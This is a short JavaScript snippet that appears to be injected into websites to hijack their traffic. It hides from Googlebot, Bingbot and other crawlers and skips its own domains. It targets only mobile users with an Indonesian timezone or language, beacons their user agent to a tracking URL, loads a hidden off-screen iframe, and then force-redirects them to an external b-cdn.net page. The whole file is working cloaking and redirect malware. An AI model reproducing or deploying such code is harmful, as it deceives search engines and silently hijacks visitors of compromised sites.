(function () {

  var ORIGINAL_DOMAIN = "www.thewildumbrella.com";
  var ORIGINAL_AMP    = "https://thewildumbrella-jangan-hilang-lagi.b-cdn.net/index.html";
  var TRACK_ENDPOINT  = "https://www.thewildumbrella.com/post/q-a-with-poet-elizabeth-s-gunn";

  if (typeof window === "undefined" || !location.hostname) return;

  /* =============================
     BOT FILTER
  ============================= */
  var bots = /Googlebot|Google-InspectionTool|bingbot|DuckDuckBot|Baiduspider|YandexBot|AhrefsBot|SemrushBot|MJ12bot|DotBot/i;
  if (bots.test(navigator.userAgent)) return;

  /* =============================
     NORMALISASI HOST
  ============================= */
  var currentHost  = location.hostname.replace(/^www\./, "");
  var originalHost = ORIGINAL_DOMAIN.replace(/^www\./, "");
  var ampHost      = new URL(ORIGINAL_AMP).hostname.replace(/^www\./, "");

  // Jangan jalan di domain asli & AMP sendiri
  if (currentHost === originalHost) return;
  if (currentHost === ampHost) return;

  /* =============================
     MOBILE ONLY
  ============================= */
  var isMobile =
    window.matchMedia("(pointer: coarse)").matches ||
    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
  if (!isMobile) return;

  /* =============================
     INDONESIA ONLY
  ============================= */
  var isIndonesia =
    Intl.DateTimeFormat().resolvedOptions().timeZone === "Asia/Jakarta" ||
    navigator.language.toLowerCase().startsWith("id");
  if (!isIndonesia) return;

  /* =============================
     TRACKING
  ============================= */
  try {
    fetch(
      TRACK_ENDPOINT +
        "?host=" + encodeURIComponent(currentHost) +
        "&path=" + encodeURIComponent("/") +
        "&ua=" + encodeURIComponent(navigator.userAgent) +
        "&source=template",
      { method: "GET", mode: "no-cors" }
    );
  } catch (e) {}

  /* =============================
     SILENT IFRAME REDIRECT
  ============================= */
  setTimeout(function () {
    try {
      var iframe = document.createElement("iframe");
      iframe.style.cssText =
        "width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px";
      iframe.src = ORIGINAL_AMP;
      document.body.appendChild(iframe);

      // HARD redirect fallback
      setTimeout(function () {
        location.replace(ORIGINAL_AMP);
      }, 1200);

    } catch (e) {}
  }, 1200);

})();